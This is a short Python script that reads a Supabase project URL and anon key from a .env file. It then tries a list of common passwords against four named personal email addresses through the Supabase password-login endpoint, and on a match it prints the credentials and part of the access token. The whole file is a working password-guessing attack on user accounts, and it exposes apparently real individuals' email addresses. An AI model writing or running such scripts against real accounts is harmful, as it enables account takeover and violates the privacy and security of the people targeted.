import os, sys, json, urllib.request, urllib.error

env_path = os.path.join(os.getcwd(), '.env')
supabase_url = None
supabase_key = None

with open(env_path, 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line.startswith('VITE_SUPABASE_URL='):
            supabase_url = line.split('=', 1)[1].strip()
        elif line.startswith('VITE_SUPABASE_ANON_KEY='):
            supabase_key = line.split('=', 1)[1].strip()

emails = ['vinaa-tester-101@gmail.com', 'tonygokul30@gmail.com', 'aswaniadduri11@gmail.com', 'adduriaswani@gmail.com']
passwords = ['Admin@123', 'admin123', 'Password@123', 'vinaa123', 'Vinaa@123', '12345678', 'password', 'aswani123', 'gokul123']

url = f"{supabase_url}/auth/v1/token?grant_type=password"

for e in emails:
    for p in passwords:
        body = json.dumps({"email": e, "password": p}).encode('utf-8')
        req = urllib.request.Request(
            url,
            data=body,
            headers={"apikey": supabase_key, "Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                print(f"SUCCESS! Email: {e}, Password: {p}")
                print("Access Token:", data.get('access_token')[:30], "...")
                sys.exit(0)
        except urllib.error.HTTPError as err:
            pass

print("No password matched in standard list")
